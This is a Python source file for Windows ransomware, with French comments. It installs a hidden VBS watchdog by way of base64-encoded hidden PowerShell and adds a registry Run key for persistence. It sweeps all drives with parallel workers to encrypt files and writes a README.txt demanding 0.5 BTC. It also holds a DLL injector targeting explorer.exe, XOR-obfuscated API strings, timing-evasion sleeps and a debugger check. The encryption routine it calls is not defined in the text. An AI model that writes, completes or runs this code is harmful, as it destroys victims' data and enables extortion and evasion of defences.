import ctypes
import os
import sys
import time
import random
import hashlib
from ctypes import wintypes
from pathlib import Path
import string
import multiprocessing
import winreg
import subprocess
from queue import Empty
import time
import random
import base64
import psutil


vbs_template = r'''On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
target = "{script_path}"
watchdogName = "watchdog.vbs"

Set colMe = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
count = 0
For Each proc In colMe
    If InStr(LCase(proc.CommandLine), LCase(watchdogName)) > 0 Then
        count = count + 1
    End If
Next
If count > 1 Then
    WScript.Quit
End If

Randomize
WScript.Sleep (Int((80 * Rnd) + 10) * 1000)

Do
    found = False
    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='python.exe' OR Name='pythonw.exe'")
    For Each objProcess In colProcessList
        If InStr(LCase(objProcess.CommandLine), LCase(" " & target & " ")) > 0 Or _
           Right(LCase(objProcess.CommandLine), Len(target)) = LCase(target) Then
            found = True
            Exit For
        End If
    Next

    If Not found Then
        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process -WindowStyle Hidden -FilePath 'pythonw.exe' -ArgumentList '" & target & "'""", 0, False
    End If

    WScript.Sleep 5000
Loop
'''

key = os.urandom(32)  # 256 bits

extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com", ".locked", ".vbs")

folders_exclus = [
    "windows",
    "program files",
    "program files (x86)",
    "system volume information",
    "$recycle.bin",
    ".git",
    "boot",
    "temp",
    "tmp",
    "cache",
    "appdata",
    "local",
    "microsoft",
    "programdata",
    ".vscode",
    "ransomware"
]

vbsFile = []

script_python_path = os.path.abspath(__file__)

target_dirs = [
    os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes"),
]

def deleteVbsFileAfterFinish():
    for file in vbsFile:
        try:
            if os.path.exists(file):
                os.remove(file)
                print(f"supprimer vbs avec success {file}")
            else:
                print(f"Fichier introuvable : {file}")
        except Exception as e:
            print(f"[!] Erreur suppresion watchdog dans {file}: {e}")


def create_watchdog_vbs():
    script_final = vbs_template.format(script_path=script_python_path.replace("\\", "\\\\"))
    b64_vbs = base64.b64encode(script_final.encode()).decode()
    DETACHED_PROCESS = 0x00000008
    CREATE_NEW_PROCESS_GROUP = 0x00000200

    for folder in target_dirs:
        try:
            if not os.path.exists(folder):
                os.makedirs(folder)
                
            
            existing_vbs = [
                f for f in os.listdir(folder)
                if f.lower().endswith('.vbs') and f.lower().startswith('watchdog')
            ]
            
            if existing_vbs:
                print(f"[!] Fichier watchdog déjà présent dans {folder}, watchdog non créé.")
                vbs_exist_path = os.path.join(folder, existing_vbs[0])
                if is_watchdog_running(vbs_exist_path):
                    print(f"[!] Watchdog déjà actif : {vbs_exist_path}")
                    return
                else:
                    subprocess.Popen(
                        ["wscript.exe", vbs_exist_path],
                        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL)
                    return

            vbs_path = os.path.join(folder, "watchdog.vbs")
            vbsFile.append(vbs_path)

            escaped_vbs_path = vbs_path.replace("\\", "\\\\")

            #mettre vbs en memoire avec base64 
            powershell_command = (
                f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command '
                f'"$b64 = \'{b64_vbs}\'; '
                f'$vbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); '
                f'[System.IO.File]::WriteAllText(\'{escaped_vbs_path}\', $vbs); '
                f'Start-Process -WindowStyle Hidden wscript.exe \'{escaped_vbs_path}\'"'
            )
            subprocess.Popen(
                powershell_command,
                shell=True,
                creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            #with open(vbs_path, "w", encoding="utf-8") as f:
            #    f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
            print(f"Watchdog créé dans {vbs_path}")
        except Exception as e:  
            print(f"Erreur création watchdog dans {folder}: {e}")

def is_watchdog_running(watchdog_vbs_path):
    watchdog_vbs_path = watchdog_vbs_path.lower()
    for proc in psutil.process_iter(['name', 'cmdline']):
        try:
            name = proc.info['name']
            cmdline = proc.info['cmdline']
            if name and 'wscript.exe' in name.lower():
                if cmdline and any(watchdog_vbs_path in arg.lower() for arg in cmdline):
                    return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def ajouter_run_key_watchdog():
    hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
    os.makedirs(hidden_dir, exist_ok=True)

    nom_valeur = "WatchdogAuto"
    chemin_watchdog_vbs = os.path.join(hidden_dir, "watchdog.vbs")

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_watchdog_vbs)
        winreg.CloseKey(key)
        print("Clé Run watchdog ajoutée avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'ajout watchdog dans le registre : {e}")


def is_in_excluded_folder(file_path: Path):
    try:
        path_parts = [part.lower() for part in file_path.resolve().parts]
        for exclu in folders_exclus:
            for part in path_parts:
                if exclu in part:
                    return True
        return False
    except Exception as e:
        print(f"Erreur exclusion sur {file_path}: {e}")
        return True  

def get_existing_root_path():
    root_paths = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:/"
        if Path(drive).exists():
            root_paths.append(drive)
    return root_paths


def worker(queue):
    while True:
        try:
            file = queue.get(timeout=10)
        except Empty:
            break
        if file is None:
            break
        try:
            if is_in_excluded_folder(file):
                continue
            if file.is_file() and file.suffix.lower() not in extensions_exclues :
                encrypte_file(str(file))
                # Pause aléatoire entre 0.5 et 3 secondes
                time.sleep(random.uniform(0.5, 3))
        except Exception as e:
            print(f"[!] Erreur sur {file}: {e}")

def process_par_lecteur(chemin, nb_process):
    chemin = Path(chemin)
    queue = multiprocessing.Queue(maxsize=30)

    processus = []
    for _ in range(nb_process):
        p = multiprocessing.Process(target=worker, args=(queue,))
        p.start()
        processus.append(p)

    for file in chemin.rglob("*"):
        try:
            queue.put(file)
        except Exception as e:
            print(f"[!] Erreur ajout fichier à la queue: {e}")

    for _ in range(nb_process):
        queue.put(None)
    max_relaunch = 3
    relaunch_counts = [0] * nb_process

    while True:
        all_finished = True
        for i, p in enumerate(processus):
            if not p.is_alive():
                if p.exitcode != 0:  # crash / erreur
                    if relaunch_counts[i] < max_relaunch:
                        print(f"[!] Worker {i} mort anormalement, redémarrage ({relaunch_counts[i]+1}/{max_relaunch})...")
                        new_p = multiprocessing.Process(target=worker, args=(queue,))
                        new_p.start()
                        processus[i] = new_p
                        relaunch_counts[i] += 1
                        all_finished = False
                    else:
                        print(f"[!] Worker {i} a atteint la limite de relance.")
                else:
                    # worker terminé proprement, on ne relance pas
                    print(f"[+] Worker {i} a terminé normalement.")
            else:
                all_finished = False
        if all_finished:
            break
        time.sleep(10)
        
def afficher_ransom_note(lecteurs):
    note = """Vos fichiers ont été chiffrés.
Veuillez envoyer 0.5 BTC à l'adresse XXXXXXXX pour obtenir la clé."""
    for folder in lecteurs:
        path = os.path.join(folder, "README.txt")
        try:
            with open(path, "w") as f:
                f.write(note)
        except:
            continue

#------------
def find_explorer_pid():
    """Find explorer.exe PID with fallback methods"""
    print("\n=== PROCESS FINDER ===")
    
    # Random sleep to evade timing analysis
    time.sleep(random.uniform(0.5, 1.5))
    
    # Method 1: Try psutil first
    try:
        import psutil
        print("[+] Using psutil to find explorer.exe")
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == 'explorer.exe':
                pid = proc.info['pid']
                print(f"[+] Found explorer.exe (PID: {pid}) using psutil")
                return pid
    except ImportError:
        print("[!] psutil not available, using ctypes fallback")

def xor_decrypt(data, key):
    """Decrypt XOR-encrypted bytes back to string"""
    decrypted = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])
    return decrypted.decode('utf-8')

def xor_encrypt(data, key):
    """Encrypt string data using XOR with key"""
    data_bytes = data.encode('utf-8')  # Convert string to bytes first
    return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data_bytes)])
KEY = "x0rK3y"
DEFAULT_DLL_PATH = xor_encrypt(r"/home/mehdi/Desktop/ransomware/migrationv2.py", KEY)
OBF_KERNEL32 = xor_encrypt("kernel32.dll", KEY)
OBF_ENCRYPTION_TARGET = xor_encrypt("ENCRYPTION_TARGET", KEY)

def hash_string(s):
    return int(hashlib.md5(s.encode()).hexdigest()[:8], 16)

class DllInjector:
    def __init__(self, dll_path):
        self.dll_path = os.path.abspath(xor_decrypt(dll_path, KEY))
        self._setup_functions()

    def _setup_functions(self):
        """Initialize Windows API functions with obfuscated names"""
        self.kernel32 = ctypes.WinDLL(xor_decrypt(OBF_KERNEL32, KEY), use_last_error=True)
        
        # Configure function prototypes
        self.OpenProcess = self.kernel32.OpenProcess
        self.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        self.OpenProcess.restype = wintypes.HANDLE
        
        self.VirtualAllocEx = self.kernel32.VirtualAllocEx
        self.VirtualAllocEx.argtypes = [
            wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD
        ]
        self.VirtualAllocEx.restype = wintypes.LPVOID
        
        self.WriteProcessMemory = self.kernel32.WriteProcessMemory
        self.WriteProcessMemory.argtypes = [
            wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
        ]
        self.WriteProcessMemory.restype = wintypes.BOOL
        
        self.GetModuleHandle = self.kernel32.GetModuleHandleW
        self.GetModuleHandle.argtypes = [wintypes.LPCWSTR]
        self.GetModuleHandle.restype = wintypes.HMODULE
        
        self.GetProcAddress = self.kernel32.GetProcAddress
        self.GetProcAddress.argtypes = [wintypes.HMODULE, ctypes.c_char_p]
        self.GetProcAddress.restype = wintypes.LPVOID
        
        self.CreateRemoteThread = self.kernel32.CreateRemoteThread
        self.CreateRemoteThread.argtypes = [
            wintypes.HANDLE, ctypes.POINTER(ctypes.c_ulong), ctypes.c_size_t, wintypes.LPVOID,
            wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)
        ]
        self.CreateRemoteThread.restype = wintypes.HANDLE
        
        self.CloseHandle = self.kernel32.CloseHandle
        self.CloseHandle.argtypes = [wintypes.HANDLE]
        self.CloseHandle.restype = wintypes.BOOL

    def inject(self, pid, target_dir=None):
        """Enhanced injection with detailed debugging"""
        print("\n=== INJECTION DEBUGGING ===")
        
        # Random sleep to evade timing analysis
        time.sleep(random.uniform(0.5, 2.5))
        
        # 1. Verify DLL exists
        if not os.path.exists(self.dll_path):
            print(f"[!] DLL not found at: {self.dll_path}")
            return False
        print(f"[+] DLL verified: {self.dll_path}")
        
        # 2. Set environment variable
        if target_dir:
            target_dir = os.path.abspath(target_dir)
            os.environ[xor_decrypt(OBF_ENCRYPTION_TARGET, KEY)] = target_dir
            print(f"[+] Set {xor_decrypt(OBF_ENCRYPTION_TARGET, KEY)}={target_dir}")
            
            # Verify target directory
            if not os.path.exists(target_dir):
                print(f"[!] Target directory does not exist: {target_dir}")
                return False
            print(f"[+] Target directory verified")
        
        # 3. Open target process
        PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
        process = self.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not process:
            error = ctypes.get_last_error()
            print(f"[!] Failed to open process (PID: {pid}, Error: {error})")
            return False
        print(f"[+] Process opened successfully (PID: {pid})")
        
        try:
            # 4. Allocate memory in target process
            mem_size = (len(self.dll_path) + 1) * 2  # Unicode string size
            dll_path_remote = self.VirtualAllocEx(
                process, 
                None,
                mem_size,
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                0x40     # PAGE_EXECUTE_READWRITE
            )
            
            if not dll_path_remote:
                error = ctypes.get_last_error()
                print(f"[!] Memory allocation failed (Error: {error})")
                return False
            print(f"[+] Allocated {mem_size} bytes at {hex(dll_path_remote)}")
            
            # 5. Write DLL path to target process
            written = ctypes.c_size_t(0)
            dll_path_encoded = self.dll_path.encode('utf-16le') + b'\x00\x00'
            if not self.WriteProcessMemory(
                process,
                dll_path_remote,
                dll_path_encoded,
                len(dll_path_encoded),
                ctypes.byref(written)
            ):
                error = ctypes.get_last_error()
                print(f"[!] Memory write failed (Error: {error})")
                return False
            print(f"[+] Wrote DLL path to target process ({written.value} bytes)")
            
            # 6. Get LoadLibraryW address using hash-based lookup
            kernel32_hash = hash_string("kernel32.dll")
            loadlib_hash = hash_string("kernel32.dll!LoadLibraryW")
            
            kernel32_handle = self.GetModuleHandle(ctypes.create_unicode_buffer(xor_decrypt(OBF_KERNEL32, KEY)))
            if not kernel32_handle:
                error = ctypes.get_last_error()
                print(f"[!] Failed to get kernel32 handle (Error: {error})")
                return False
            print("[+] Found kernel32.dll")
            
            # Use hash to get function address
            func_map = {
                hash_string("kernel32.dll!LoadLibraryW"): b"LoadLibraryW"
            }
            
            load_library = self.GetProcAddress(kernel32_handle, func_map[loadlib_hash])
            if not load_library:
                error = ctypes.get_last_error()
                print(f"[!] Failed to get LoadLibraryW address (Error: {error})")
                return False
            print(f"[+] Found LoadLibraryW at {hex(load_library)}")
            
            # 7. Create remote thread
            thread = self.CreateRemoteThread(
                process,
                None,
                0,
                load_library,
                dll_path_remote,
                0,
                None
            )
            
            if not thread:
                error = ctypes.get_last_error()
                print(f"[!] Thread creation failed (Error: {error})")
                return False
            print(f"[+] Created remote thread ({thread})")
            
            # 8. Wait for completion
            WAIT_TIMEOUT = 0x00000102
            result = self.kernel32.WaitForSingleObject(thread, 10000)  # 10 second timeout
            if result == WAIT_TIMEOUT:
                print("[!] Thread execution timed out")
            else:
                print("[+] Thread executed successfully")
            
            self.CloseHandle(thread)
            return True
            
        finally:
            self.CloseHandle(process)
#------------------
def main():
    time.sleep(random.uniform(5, 15))
    existDir = os.path.dirname(os.path.abspath(__file__))
    if existDir.lower() not in folders_exclus:
        folders_exclus.append(existDir.lower())

    create_watchdog_vbs()
    ajouter_run_key_watchdog()
    if ctypes.windll.kernel32.IsDebuggerPresent():
        print("[!] Debugger detected - exiting")
        sys.exit(1)

    default_dll = xor_decrypt(DEFAULT_DLL_PATH, KEY)

    pid = find_explorer_pid()
    if not pid:
        print("❌ Could not find explorer.exe process")
        sys.exit(1)

    injector = DllInjector(DEFAULT_DLL_PATH)

    lecteurs = get_existing_root_path()
    max_workers = 30
    nb_lecteurs = len(lecteurs)
    nb_process_par_lecteur = max(1, max_workers // nb_lecteurs)
    processus_lecteurs = []

    for lecteur in lecteurs:
        p = multiprocessing.Process(target=process_par_lecteur, args=(lecteur, nb_process_par_lecteur))
        p.start()
        processus_lecteurs.append(p)

    for p in processus_lecteurs:
        p.join()

    deleteVbsFileAfterFinish()
    afficher_ransom_note(lecteurs)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()